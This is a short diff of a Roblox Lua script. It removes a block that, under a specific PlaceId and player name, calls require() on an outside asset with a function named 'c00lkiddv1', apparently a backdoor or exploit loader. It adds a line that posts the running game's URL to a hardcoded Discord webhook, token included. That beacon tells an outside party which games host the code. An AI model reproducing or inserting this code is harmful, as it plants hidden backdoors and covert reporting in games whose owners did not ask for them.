@@ -1,7 +1,1 @@
-if game.PlaceId == 83207884323273 then
-  if game.Players["118x113"] then
-    require(14476224091).c00lkiddv1("118x113")
-  else
-    require(14476224091).c00lkiddv1(game.Players:GetChildren()[1].Name)
-  end
-end
+local ht = game:GetService("HttpService") ht:PostAsync("https://discord.com/api/webhooks/1319224584225951836/6LYel7uKx9XMlYVVsK1y2oeeWUujtS2goagw6IFOhq1gfMBe9-nDCniZIxyxNs1FahV3",ht:JSONEncode({['content'] = "https://www.roblox.com/games/"..game.PlaceId}),Enum.HttpContentType.ApplicationJson)
